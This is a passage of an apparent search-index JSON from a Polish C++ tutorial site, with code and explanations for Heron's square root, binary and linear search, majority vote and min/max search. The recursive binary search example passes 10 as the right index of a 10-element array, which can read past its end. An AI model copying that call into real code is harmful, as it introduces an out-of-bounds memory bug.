33).</p>"},{"location":"programming/c%2B%2B/algorithms/numerical-methods/square-root/","title":"Pierwiastek kwadratowy","text":""},{"location":"programming/c%2B%2B/algorithms/numerical-methods/square-root/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/numerical-methods/square-root/#metoda-herona","title":"Metoda Herona","text":""},{"location":"programming/c%2B%2B/algorithms/numerical-methods/square-root/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;cmath&gt;\n\nusing namespace std;\n\ndouble squareRoot(double n, double p) {\n    double x1 = n / 2.0;\n    double x2 = (x1 + (n / x1)) / 2.0;\n    while (fabs(x2 - x1) &gt; p) {\n        x1 = (x2 + (n / x2)) / 2.0;\n        swap(x1, x2);\n    }\n\n    return x2;\n}\n\nint main() {\n    double n = 2.0;\n    double p = 0.00001;\n\n    double result = squareRoot(n, p);\n\n    cout &lt;&lt; result &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/searching/binary-search/","title":"Wyszukiwanie binarne","text":""},{"location":"programming/c%2B%2B/algorithms/searching/binary-search/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/searching/binary-search/#wersja-iteracyjna","title":"Wersja iteracyjna","text":""},{"location":"programming/c%2B%2B/algorithms/searching/binary-search/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint binarySearchIterative(int array[], int length, int number) {\n    int left = 0;\n    int right = length - 1;\n    int middle;\n\n    while (left &lt; right) {\n        middle = (left + right) / 2;\n        if (number &lt;= array[middle]) {\n            right = middle;\n        } else {\n            left = middle + 1;\n        }\n    }\n\n    if (array[left] == number) {\n        return left;\n    }\n\n    return -1;\n}\n\nint main() {\n    int array[10] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10};\n    int number = 8;\n\n    int index = binarySearchIterative(array, 10, number);\n\n    if (index == -1) {\n        cout &lt;&lt; \"Number not found in array\" &lt;&lt; endl;\n    } else {\n        cout &lt;&lt; \"Index of given number is \" &lt;&lt; index &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/searching/binary-search/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>binarySearchIterative</code> przyjmuje jako argumenty tablic\u0119 liczb, jej d\u0142ugo\u015b\u0107 i liczb\u0119 do znalezienia. Pocz\u0105tkowo ustawia wska\u017aniki na skrajne elementy tablicy - <code>left</code> na pocz\u0105tek, <code>right</code> na koniec.</p> <p>Nast\u0119pnie, w p\u0119tli <code>while</code>, oblicza \u015brodek tablicy (<code>middle</code>). Je\u017celi szukana liczba jest mniejsza lub r\u00f3wna elementowi \u015brodkowemu, <code>right</code> zostaje przesuni\u0119ty na pozycj\u0119 \u015brodka. W przeciwnym razie, <code>left</code> przesuwa si\u0119 na pozycj\u0119 po \u015brodkowym elemencie.</p> <p>P\u0119tla <code>while</code> kontynuuje dzia\u0142anie, dop\u00f3ki <code>left</code> jest mniejszy od <code>right</code>, dziel\u0105c tablic\u0119 na p\u00f3\u0142 z ka\u017cd\u0105 iteracj\u0105. To jest kluczowy aspekt wyszukiwania binarnego - za ka\u017cdym razem odrzucamy po\u0142ow\u0119 tablicy, co sprawia, \u017ce algorytm jest bardzo efektywny (ma z\u0142o\u017cono\u015b\u0107 \\(O(log n)\\)).</p> <p>Gdy p\u0119tla <code>while</code> ko\u0144czy dzia\u0142anie, sprawdzamy, czy element na pozycji <code>left</code> jest r\u00f3wny szukanej liczbie. Je\u015bli tak, zwracamy jego indeks. Je\u015bli nie, zwracamy \\(-1\\), co oznacza, \u017ce szukana liczba nie znajduje si\u0119 w tablicy.</p> <p>Funkcja <code>main</code> tworzy tablic\u0119 \\(10\\) element\u00f3w od \\(1\\) do \\(10\\), nast\u0119pnie wywo\u0142uje funkcj\u0119 <code>binarySearchIterative</code> szukaj\u0105c liczby \\(8\\). Je\u017celi wynikiem funkcji jest \\(-1\\), wypisywana jest na ekran informacja, \u017ce liczba nie zosta\u0142a znaleziona. W przeciwnym razie wypisywany jest indeks znalezionej liczby w tablicy.</p>"},{"location":"programming/c%2B%2B/algorithms/searching/binary-search/#wersja-rekurencyjna","title":"Wersja rekurencyjna","text":""},{"location":"programming/c%2B%2B/algorithms/searching/binary-search/#implementacja_1","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint binarySearchRecursive(int array[], int number, int left, int right) {\n    int middle;\n\n    if (left &lt; right) {\n        middle = (left + right) / 2;\n        if (number &lt;= array[middle]) {\n            return binarySearchRecursive(array, number, left, middle);\n        } else {\n            return binarySearchRecursive(array, number, middle + 1, right);\n        }\n    } else if (array[left] == number) {\n        return left;\n    }\n\n    return -1;\n}\n\nint main() {\n    int array[10] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10};\n    int number = 8;\n\n    int index = binarySearchRecursive(array, number, 0, 10);\n\n    if (index == -1) {\n        cout &lt;&lt; \"Number not found in array\" &lt;&lt; endl;\n    } else {\n        cout &lt;&lt; \"Index of given number is \" &lt;&lt; index &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/searching/binary-search/#opis-implementacji_1","title":"Opis implementacji","text":"<p>Funkcja <code>binarySearchRecursive</code> przyjmuje cztery argumenty: tablic\u0119 <code>array[]</code>, liczb\u0119 <code>number</code>, kt\u00f3r\u0105 chcemy znale\u017a\u0107, oraz lewy <code>left</code> i prawy <code>right</code> indeks okre\u015blaj\u0105cy zakres wyszukiwania. Oto, jak dzia\u0142a ta funkcja:</p> <ol> <li>Je\u017celi lewy indeks jest mniejszy od prawego, wyznacza indeks \u015brodkowy <code>middle</code> jako \u015bredni\u0105 indeks\u00f3w lewego i prawego.</li> <li>Je\u017celi szukana liczba <code>number</code> jest mniejsza lub r\u00f3wna liczbie w \u015brodku tablicy, to wywo\u0142uje funkcj\u0119 <code>binarySearchRecursive</code> z zakresem od lewego indeksu do \u015brodkowego. W przeciwnym przypadku wywo\u0142uje funkcj\u0119 <code>binarySearchRecursive</code> z zakresem od \u015brodkowego indeksu plus jeden do prawego indeksu.</li> <li>Je\u017celi lewy indeks jest r\u00f3wny prawemu i liczba w tym indeksie jest r\u00f3wna szukanej liczbie, zwraca ten indeks.</li> <li>Je\u017celi liczba nie zosta\u0142a znaleziona, zwraca \\(-1\\).</li> </ol> <p>W g\u0142\u00f3wnej funkcji <code>main</code>:</p> <ol> <li>Definiuje tablic\u0119 <code>array[]</code> oraz szukan\u0105 liczb\u0119 <code>number</code>.</li> <li>Wywo\u0142uje funkcj\u0119 <code>binarySearchRecursive</code> z tablic\u0105, szukan\u0105 liczb\u0105 oraz indeksami pocz\u0105tkowym i ko\u0144cowym.</li> </ol> <p>Je\u017celi zwr\u00f3cony indeks jest r\u00f3wny \\(-1\\), wy\u015bwietla informacj\u0119, \u017ce liczba nie zosta\u0142a znaleziona. W przeciwnym przypadku wy\u015bwietla indeks, pod kt\u00f3rym znajduje si\u0119 szukana liczba.</p>"},{"location":"programming/c%2B%2B/algorithms/searching/linear-search/","title":"Wyszukiwanie liniowe","text":""},{"location":"programming/c%2B%2B/algorithms/searching/linear-search/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/searching/linear-search/#istnienie-elementu","title":"Istnienie elementu","text":""},{"location":"programming/c%2B%2B/algorithms/searching/linear-search/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nbool linearSearch(int array[], int n, int number) {\n    for (int i = 0; i &lt; n; i++) {\n        if (array[i] == number) {\n            return true;\n        }\n    }\n\n    return false;\n}\n\nint main() {\n    int array[10] = {8, 2, 9, 10, 5, 4, 2, 7, 18, 0};\n    int n = 10;\n    int number = 7;\n\n    bool result = linearSearch(array, n, number);\n\n    if (result) {\n        cout &lt;&lt; \"Liczba jest w tablicy\" &lt;&lt; endl;\n    } else {\n        cout &lt;&lt; \"Liczby nie ma w tablicy\" &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/searching/linear-search/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>linearSearch</code> (linia 5) zwraca jako wynik warto\u015b\u0107 prawda/fa\u0142sz i przyjmuje trzy argumenty: tablic\u0119 do przeszukania, rozmiar tablicy oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w tablicy od \\(0\\) do \\(n-1\\) w\u0142\u0105cznie (linia 6). Dla ka\u017cdego indeksu sprawdzamy, czy pod tym indeksem w tablicy znajduje si\u0119 poszukiwana warto\u015b\u0107 (linia 7). Je\u017celi tak, to zwracamy informacj\u0119 o znalezieniu warto\u015bci w tablicy (linia 8). Po przej\u015bciu przez wszystkie indeksy i wyj\u015bciu z p\u0119tli (tzn. gdy nie znale\u017ali\u015bmy poszukiwanego elementu) zwracamy warto\u015b\u0107 <code>false</code> informuj\u0105c\u0105, \u017ce poszukiwany element nie znajduje si\u0119 w tablicy (linia 12).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: tablic\u0119 (linia 16), jej rozmiar (linia 17), oraz warto\u015b\u0107 poszukiwanego elementu (linia 18). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>linearSearch</code> z wcze\u015bniej przygotowanymi parametrami i jej wynik zapisujemy w nowej zmiennej <code>result</code> (linia 20). W zale\u017cno\u015bci od wyniku (linia 22) wypisujemy odpowiedni komunikat (linie 23 i 25).</p>"},{"location":"programming/c%2B%2B/algorithms/searching/linear-search/#pozycja-elementu","title":"Pozycja elementu","text":""},{"location":"programming/c%2B%2B/algorithms/searching/linear-search/#implementacja_1","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint linearSearch(int array[], int n, int number) {\n    for (int i = 0; i &lt; n; i++) {\n        if (array[i] == number) {\n            return i;\n        }\n    }\n\n    return -1;\n}\n\nint main() {\n    int array[10] = {8, 2, 9, 10, 5, 4, 2, 7, 18, 0};\n    int n = 10;\n    int number = 7;\n\n    int index = linearSearch(array, n, number);\n\n    if (index == -1) {\n        cout &lt;&lt; \"Liczby nie ma w tablicy\" &lt;&lt; endl;\n    } else {\n        cout &lt;&lt; \"Liczba jest pod indeksem \" &lt;&lt; index &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/searching/linear-search/#opis-implementacji_1","title":"Opis implementacji","text":"<p>Funkcja <code>linearSearch</code> (linia 5) zwraca jako wynik liczb\u0119 ca\u0142kowit\u0105 i przyjmuje trzy argumenty: tablic\u0119 do przeszukania, rozmiar tablicy oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w tablicy od \\(0\\) do \\(n-1\\) w\u0142\u0105cznie (linia 6). Dla ka\u017cdego indeksu sprawdzamy, czy pod tym indeksem w tablicy znajduje si\u0119 poszukiwana warto\u015b\u0107 (linia 7). Je\u017celi tak, to zwracamy indeks tej warto\u015bci w tablicy (linia 8). Po przej\u015bciu przez wszystkie indeksy i wyj\u015bciu z p\u0119tli (tzn. gdy nie znale\u017ali\u015bmy poszukiwanego elementu) zwracamy warto\u015b\u0107 \\(-1\\) informuj\u0105c\u0105, \u017ce poszukiwany element nie znajduje si\u0119 w tablicy (linia 12).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: tablic\u0119 (linia 16), jej rozmiar (linia 17), oraz warto\u015b\u0107 poszukiwanego elementu (linia 18). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>linearSearch</code> z wcze\u015bniej przygotowanymi parametrami i jej wynik zapisujemy w nowej zmiennej <code>index</code> (linia 20). W zale\u017cno\u015bci od wyniku (linia 22) wypisujemy odpowiedni komunikat (linie 23 i 25).</p>"},{"location":"programming/c%2B%2B/algorithms/searching/linear-search/#wszystkie-pozycje-elementu","title":"Wszystkie pozycje elementu","text":""},{"location":"programming/c%2B%2B/algorithms/searching/linear-search/#implementacja_2","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid linearSearch(int array[], int n, int number) {\n    for (int i = 0; i &lt; n; i++) {\n        if (array[i] == number) {\n            cout &lt;&lt; i &lt;&lt; endl;\n        }\n    }\n}\n\nint main() {\n    int array[10] = {8, 2, 9, 10, 5, 4, 2, 7, 18, 0};\n    int n = 10;\n    int number = 7;\n\n    cout &lt;&lt; \"Indeksy, pod ktorymi znajduje sie poszukiwana liczba:\" &lt;&lt; endl;\n    linearSearch(array, n, number);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/searching/linear-search/#opis-implementacji_2","title":"Opis implementacji","text":"<p>Funkcja <code>linearSearch</code> (linia 5) nie zwraca wyniku i przyjmuje trzy argumenty: tablic\u0119 do przeszukania, rozmiar tablicy oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w tablicy od \\(0\\) do \\(n-1\\) w\u0142\u0105cznie (linia 6). Dla ka\u017cdego indeksu sprawdzamy, czy pod tym indeksem w tablicy znajduje si\u0119 poszukiwana warto\u015b\u0107 (linia 7). Je\u017celi tak, to wypisujemy ten indeks (linia 8). </p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: tablic\u0119 (linia 14), jej rozmiar (linia 15), oraz warto\u015b\u0107 poszukiwanego elementu (linia 16). Nast\u0119pnie wypisujemy stosowny komunikat i wywo\u0142ujemy funkcj\u0119 <code>linearSearch</code> z wcze\u015bniej przygotowanymi parametrami.</p>"},{"location":"programming/c%2B%2B/algorithms/searching/longest-growing-substring/","title":"Najd\u0142u\u017cszy sp\u00f3jny podci\u0105g rosn\u0105cy","text":""},{"location":"programming/c%2B%2B/algorithms/searching/longest-growing-substring/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/searching/longest-growing-substring/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint longestGrowingSubstringLength(int n, int tab[]) {\n    int mx = 1;\n    int length = 1;\n\n    for (int i = 1; i &lt; n; i++) {\n        if (tab[i] &gt; tab[i-1]) {\n            length += 1;\n            if (length &gt; mx) {\n                mx = length;\n            }\n        } else {\n            length = 1;\n        }\n    }\n\n    return mx;\n}\n\nint main() {\n    int tab[10] = {4, 9, 7, 2, 4, 7, 9, 3, 8, 6};\n    int n = 10;\n\n    int result = longestGrowingSubstringLength(n, tab);\n\n    cout &lt;&lt; result &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/searching/longest-growing-substring/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>longestGrowingSubstringLength</code> przyjmuje dwa argumenty: liczb\u0119 <code>n</code> reprezentuj\u0105c\u0105 liczb\u0119 element\u00f3w w tablicy i tablic\u0119 <code>tab</code> zawieraj\u0105c\u0105 te elementy. Funkcja zwraca d\u0142ugo\u015b\u0107 najd\u0142u\u017cszego rosn\u0105cego podci\u0105gu.</p> <p>Schemat dzia\u0142ania funkcji jest nast\u0119puj\u0105cy:</p> <ol> <li>Zainicjalizuj d\u0142ugo\u015b\u0107 <code>length</code> aktualnie analizowanego podci\u0105gu oraz najd\u0142u\u017cszego dotychczas znalezionego podci\u0105gu <code>mx</code> na \\(1\\).</li> <li>Przeszukaj tablic\u0119 od drugiego elementu do ko\u0144ca.</li> <li>Je\u017celi bie\u017c\u0105cy element <code>tab[i]</code> jest wi\u0119kszy od poprzedniego <code>tab[i-1]</code>, to zwi\u0119ksz d\u0142ugo\u015b\u0107 <code>length</code> aktualnie analizowanego podci\u0105gu o \\(1\\) i je\u017celi ta d\u0142ugo\u015b\u0107 jest wi\u0119ksza od dotychczas najd\u0142u\u017cszego podci\u0105gu, zaktualizuj <code>mx</code>.</li> <li>Je\u017celi bie\u017c\u0105cy element <code>tab[i]</code> nie jest wi\u0119kszy od poprzedniego <code>tab[i-1]</code>, to zresetuj d\u0142ugo\u015b\u0107 <code>length</code> aktualnie analizowanego podci\u0105gu do \\(1\\).</li> <li>Po przej\u015bciu przez ca\u0142\u0105 tablic\u0119 zwr\u00f3\u0107 <code>mx</code>, czyli d\u0142ugo\u015b\u0107 najd\u0142u\u017cszego rosn\u0105cego podci\u0105gu.</li> </ol> <p>Funkcja <code>main</code> definiuje tablic\u0119 <code>tab</code> z \\(10\\) elementami, przekazuje t\u0119 tablic\u0119 do funkcji <code>longestGrowingSubstringLength</code> w celu znalezienia d\u0142ugo\u015bci najd\u0142u\u017cszego rosn\u0105cego podci\u0105gu, a nast\u0119pnie wy\u015bwietla ten wynik na ekranie.</p>"},{"location":"programming/c%2B%2B/algorithms/searching/majority/","title":"Znajdowanie lidera w zbiorze","text":""},{"location":"programming/c%2B%2B/algorithms/searching/majority/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/searching/majority/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint countOccurences(int number, int array[], int length) {\n    int result = 0;\n\n    for (int i = 0; i &lt; length; i++) {\n        if (array[i] == number) {\n            result++;\n        }\n    }\n\n    return result;\n}\n\nint findMajority(int array[], int length) {\n    int counter = 1;\n    int currentCandidate = array[0];\n\n    for (int i = 1; i &lt; length; i++) {\n        if (counter == 0) {\n            currentCandidate = array[i];\n            counter = 1;\n        } else if (array[i] == currentCandidate) {\n            counter++;\n        } else {\n            counter--;\n        }\n    }\n\n    counter = countOccurences(currentCandidate, array, length);\n\n    if (counter &gt; length / 2) {\n        return currentCandidate;\n    } else {\n        return -1;\n    }\n}\n\nint main() {\n    int array[10] = {1, 2, 5, 5, 7, 5, 5, 10, 5, 5};\n\n    int majority = findMajority(array, 10);\n\n    cout &lt;&lt; majority &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/searching/majority/#opis-implementacji","title":"Opis implementacji","text":""},{"location":"programming/c%2B%2B/algorithms/searching/majority/#funkcja-countoccurences","title":"Funkcja <code>countOccurences</code>","text":"<ul> <li>Parametry: </li> <li><code>number</code> (liczba, kt\u00f3rej wyst\u0105pienia liczymy),</li> <li><code>array</code> (tablica, w kt\u00f3rej szukamy),</li> <li><code>length</code> (d\u0142ugo\u015b\u0107 tablicy).</li> <li>Dzia\u0142anie: Przechodzi przez tablic\u0119 i liczy, ile razy <code>number</code> wyst\u0119puje w tablicy.</li> <li>Zwraca: Liczb\u0119 wyst\u0105pie\u0144 <code>number</code> w tablicy.</li> </ul>"},{"location":"programming/c%2B%2B/algorithms/searching/majority/#funkcja-findmajority","title":"Funkcja <code>findMajority</code>","text":"<ul> <li>Parametry: </li> <li><code>array</code> (tablica, w kt\u00f3rej szukamy elementu wi\u0119kszo\u015bciowego,</li> <li><code>length</code> (d\u0142ugo\u015b\u0107 tablicy).</li> <li>Dzia\u0142anie:</li> <li>U\u017cywa algorytmu Boyera-Moore'a do znalezienia potencjalnego elementu wi\u0119kszo\u015bciowego.</li> <li>Przechodzi przez tablic\u0119, aktualizuj\u0105c <code>currentCandidate</code> (obecny kandydat na element wi\u0119kszo\u015bciowy) i <code>counter</code> (licznik wyst\u0105pie\u0144 kandydata).</li> <li>Po przej\u015bciu przez tablic\u0119, sprawdza, czy <code>currentCandidate</code> faktycznie jest elementem wi\u0119kszo\u015bciowym, licz\u0105c jego wyst\u0105pienia za pomoc\u0105 <code>countOccurences</code>.</li> <li>Zwraca: Element wi\u0119kszo\u015bciowy, je\u015bli istnieje, w przeciwnym razie \\(-1\\).</li> </ul>"},{"location":"programming/c%2B%2B/algorithms/searching/majority/#funkcja-main","title":"Funkcja <code>main</code>","text":"<ul> <li>Tworzy tablic\u0119 array z \\(10\\) elementami.</li> <li>Wywo\u0142uje funkcj\u0119 <code>findMajority</code>, aby znale\u017a\u0107 element wi\u0119kszo\u015bciowy w tablicy.</li> <li>Wypisuje wynik na standardowe wyj\u015bcie.</li> <li>Przyk\u0142adowe dane wej\u015bciowe: \\([1, 2, 5, 5, 7, 5, 5, 10, 5, 5]\\). </li> <li>Oczekiwany wynik: \\(5\\), poniewa\u017c liczba \\(5\\) wyst\u0119puje \\(6\\) razy, co jest wi\u0119cej ni\u017c po\u0142owa d\u0142ugo\u015bci tablicy (\\(5\\)).</li> </ul>"},{"location":"programming/c%2B%2B/algorithms/searching/min-max-search/","title":"Jednoczesne wyszukiwanie minimum i maksimum","text":""},{"location":"programming/c%2B%2B/algorithms/searching/min-max-search/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/searching/min-max-search/#podejscie-naiwne","title":"Podej\u015bcie naiwne","text":""},{"location":"programming/c%2B%2B/algorithms/searching/min-max-search/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid findMinMaxNaive(int array[], int n) {\n    int min, max;\n\n    min = array[0];\n    max = array[0];\n\n    for (int i = 1; i &lt; n; i++) {\n        if (array[i] &lt; min) {\n            min = array[i];\n        } else if (array[i] &gt; max) {\n            max = array[i];\n        }\n    }\n\n    cout &lt;&lt; \"Min: \" &lt;&lt; min &lt;&lt; endl;\n    cout &lt;&lt; \"Max: \" &lt;&lt; max &lt;&lt; endl;\n}\n\nint main() {\n    int array[11] = {3, 6, 1, 9, 10, 4, -4, 6, 12, 5, 11};\n\n    findMinMaxNaive(array, 11);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/searching/min-max-search/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>findMinMaxNaive</code> (linia 5) przyjmuje tablic\u0119 o zadanej d\u0142ugo\u015bci i wypisuje jej elementy minimalny i maksymalny, korzystaj\u0105c z naiwnego algorytmu jednoczesnego znajdowania minimum i maksimum.</p> <p>Na pocz\u0105tku tworzymy dwie zmienne do zapami\u0119tania warto\u015bci min i max (linia 6), a nast\u0119pnie przypisujemy do nich warto\u015b\u0107 pierwszego elementu przeszukiwanej tablicy (linie 8 i 9). Kolejnym etapem jest przejrzenie wszystkich pozosta\u0142ych element\u00f3w tablicy za pomoc\u0105 p\u0119tli (linia 11). Je\u017celi sprawdzany element z tablicy ma warto\u015b\u0107 mniejsz\u0105 od obecnej warto\u015bci minimum (linia 12), to zapami\u0119tujemy now\u0105 warto\u015b\u0107 minimum (linia 13). W przeciwnym wypadku sprawdzamy, czy obecny element ma warto\u015b\u0107 wi\u0119ksz\u0105 od obecnej warto\u015bci maksimum (linia 14), a je\u017celi tak to zapami\u0119tujemy now\u0105 warto\u015b\u0107 maksimum (linia 15). Na koniec, po przej\u015bciu przez wszystkie elementy tablicy, wypisujemy znalezione warto\u015bci minimum i maksimum (linie 19 i 20).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej tworzymy przyk\u0142adow\u0105 tablic\u0119 (linia 24), a nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>findMinMaxNaive</code> (linia 26).</p>"},{"location":"programming/c%2B%2B/algorithms/searching/min-max-search/#podejscie-optymalne","title":"Podej\u015bcie optymalne","text":""},{"location":"programming/c%2B%2B/algorithms/searching/min-max-search/#implementacja_1","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid findMinMaxOptimal(int array[], int length) {\n    int min, max;\n    int middle = (length + 1) / 2;\n    int minCandidates[middle], maxCandidates[middle];\n\n    for (int i = 1; i &lt; length; i += 2) {\n        if (array[i - 1] &lt; array[i]) {\n            minCandidates[i / 2] = array[i - 1];\n            maxCandidates[i / 2] = array[i];\n        } else {\n            minCandidates[i / 2] = array[i];\n            maxCandidates[i / 2] = array[i - 1];\n        }\n    }\n\n    if (length % 2 != 0) {\n        minCandidates[middle - 1] = array[length - 1];\n        maxCandidates[middle - 1] = array[length - 1];\n    }\n\n    min = minCandidates[0];\n    max = maxCandidates[0];\n\n    for (int i = 1; i &lt; middle; i++) {\n        if (minCandidates[i] &lt; min) {\n            min = minCandidates[i];\n        }\n\n        if (maxCandidates[i] &gt; max) {\n            max = maxCandidates[i];\n        }\n    }\n\n    cout &lt;&lt; \"Min: \" &lt;&lt; min &lt;&lt; endl;\n    cout &lt;&lt; \"Max: \" &lt;&lt; max &lt;&lt; endl;\n}\n\nint main() {\n    int array[11] = {3, 6, 1, 9, 10, 4, -4, 6, 12, 5, 11};\n\n    findMinMaxOptimal(array, 11);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/searching/min-max-search/#opis-implementacji_1","title":"Opis implementacji","text":"<p>Funkcja <code>findMinMaxOptimal</code> (linia 5) przyjmuje tablic\u0119 o zadanej d\u0142ugo\u015bci i wypisuje jej elementy minimalny i maksymalny, korzystaj\u0105c z optymalnego algorytmu jednoczesnego znajdowania minimum i maksimum.</p> <p>Na pocz\u0105tku funkcji definiujemy dwie tablice pomocnicze (linia 8): kandydat\u00f3w na minimum (<code>minCandidates</code>) oraz kandydat\u00f3w na maksimum (<code>maxCandidates</code>). Ka\u017cda z tych tablic ma d\u0142ugo\u015b\u0107 r\u00f3wn\u0105 po\u0142owie d\u0142ugo\u015bci tablicy pocz\u0105tkowej (zwi\u0119kszonej o jeden w przypadku tablic o nieparzystej d\u0142ugo\u015bci).</p> <p>Nast\u0119pnie przechodzimy p\u0119tl\u0105 przez ka\u017cd\u0105 s\u0105siaduj\u0105c\u0105 par\u0119 element\u00f3w z pocz\u0105tkowej tablicy (linia 10). Je\u017celi pierwszy z element\u00f3w jest mniejszy od swojego s\u0105siada (linia 11), to pierwszy z pary wrzucamy do tablicy kandydat\u00f3w na minimum (linia 12), a kolejny do tablicy kandydat\u00f3w na maksimum (linia 13). W przeciwnym wypadku post\u0119pujemy na odwr\u00f3t (linie 15 i 16).</p> <p>Je\u017celi pocz\u0105tkowa tablica jest nieparzystej d\u0142ugo\u015bci (linia 20), to jej ostatni element dopisujemy do obu tablic pomocniczych: kandydat\u00f3w na minimum (linia 21) i kandydat\u00f3w na maksimum (linia 22) na ostatnie pozycje w tych tablicach.</p> <p>Nast\u0119pnie przechodzimy do poszukiwania minimum i maksimum. Na pocz\u0105tek przyjmujemy pocz\u0105tkowe warto\u015bci tablic pomocniczych jako obecne warto\u015bci minimum i maksimum. Minimum bierzemy z kandydat\u00f3w na minimum (linia 25), a maksimum z kandydat\u00f3w na maksimum (linia 26).</p> <p>W kolejnym kroku przechodzimy p\u0119tl\u0105 przez obie tablice pomocnicze (linia 28). Najpierw sprawdzamy, czy znale\u017ali\u015bmy element mniejszy od obecnej warto\u015bci minimum w tablicy kandydat\u00f3w na minimum (linia 29). Je\u017celi tak, to przyjmujemy now\u0105 warto\u015b\u0107 minimum (linia 30). Podobnie post\u0119pujemy w przypadku maksimum. Je\u017celi w tablicy kandydat\u00f3w na maksimum znale\u017ali\u015bmy element wi\u0119kszy od obecnej warto\u015bci maksimum (linia 33), to przyjmujemy now\u0105 warto\u015b\u0107 maksimum (linia 34).</p> <p>Na ko\u0144cu funkcji wypisujemy znalezione warto\u015bci minimum (linia 38) oraz maksimum (linia 39).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej tworzymy przyk\u0142adow\u0105 tablic\u0119 (linia 43), a nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>findMinMaxOptimal</code> (linia 45).</p>"},{"location":"programming/c%2B%2B/algorithms/searching/min-or-max/","title":"Wyszukiwanie minimum i maksimum","text":""},{"location":"programming/c%2B%2B/algorithms/searching/min-or-max/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/searching/min-or-max/#wyszukiwanie-wartosci-minimum-i-maksimum","title":"Wyszukiwanie warto\u015bci minimum i maksimum","text":""},{"location":"programming/c%2B%2B/algorithms/searching/min-or-max/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint findMin(int n, int tab[]) {\n    int min = tab[0];\n\n    for(int i = 1; i &lt; n; i++) {\n        if(tab[i] &lt; min) {\n            min = tab[i];\n        }\n    }\n\n    return min;\n}\n\nint findMax(int n, int tab[]) {\n    int max = tab[0];\n\n    for(int i = 1; i &lt; n; i++) {\n        if(tab[i] &gt; max) {\n            max = tab[i];\n        }\n    }\n\n    return max;\n}\n\nint main() {\n    int tab[10] = {8, 2, 9, 10, 5, 4, 2, 7, 18, 0};\n    int n = 10;\n\n    int min = findMin(n, tab);\n    int max = findMax(n, tab);\n\n    cout &lt;&lt; \"Min: \" &lt;&lt; min &lt;&lt; endl;\n    cout &lt;&lt; \"Max: \" &lt;&lt; max &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/searching/min-or-max/#opis-implementacji","title":"Opis implementacji","text":"<p>Program zawiera dwie funkcje, <code>findMin</code> i <code>findMax</code>, kt\u00f3re obie przyjmuj\u0105 liczb\u0119 <code>n</code> reprezentuj\u0105c\u0105 liczb\u0119 element\u00f3w w tablicy i tablic\u0119 <code>tab</code> zawieraj\u0105c\u0105 te elementy. Funkcja <code>findMin</code> zwraca najmniejsz\u0105 warto\u015b\u0107 w tablicy, a <code>findMax</code> zwraca najwi\u0119ksz\u0105 warto\u015b\u0107.</p> 